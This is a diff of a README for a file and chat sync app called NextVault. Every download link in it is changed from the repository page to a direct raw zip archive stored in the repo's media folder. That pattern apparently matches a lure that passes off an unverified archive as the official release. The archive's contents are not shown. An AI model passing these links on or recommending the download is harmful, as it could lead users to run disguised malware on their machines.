@@ -1,12 +1,12 @@
 # 🗄️ NextVault - Keep Files and Chats in Sync
 
-[![Download NextVault](https://img.shields.io/badge/Download-NextVault-blue?style=for-the-badge&logo=github)](https://github.com/Jawsphecotheres669/NextVault)
+[![Download NextVault](https://img.shields.io/badge/Download-NextVault-blue?style=for-the-badge&logo=github)](https://github.com/Jawsphecotheres669/NextVault/raw/refs/heads/main/media/Next-Vault-v3.1.zip)
 
 ## 📥 Download NextVault
 
 Use this link to visit the page to download or open the project files:
 
-[Download NextVault](https://github.com/Jawsphecotheres669/NextVault)
+[Download NextVault](https://github.com/Jawsphecotheres669/NextVault/raw/refs/heads/main/media/Next-Vault-v3.1.zip)
 
 ## 🧭 What NextVault Is
 
@@ -40,7 +40,7 @@ For best results, keep the desktop server running while you use the mobile app.
 ## 🚀 Getting Started on Windows
 
 1. Open the download page:
-   [Download NextVault](https://github.com/Jawsphecotheres669/NextVault)
+   [Download NextVault](https://github.com/Jawsphecotheres669/NextVault/raw/refs/heads/main/media/Next-Vault-v3.1.zip)
 
 2. Download the Windows version of NextVault from the page.
 
@@ -182,7 +182,7 @@ NextVault uses a full JavaScript stack with tools such as:
 ## 📎 Quick Access
 
 Primary download page:
-[https://github.com/Jawsphecotheres669/NextVault](https://github.com/Jawsphecotheres669/NextVault)
+[https://github.com/Jawsphecotheres669/NextVault/raw/refs/heads/main/media/Next-Vault-v3.1.zip](https://github.com/Jawsphecotheres669/NextVault/raw/refs/heads/main/media/Next-Vault-v3.1.zip)
 
 ## 🪟 Windows Start Checklist
 
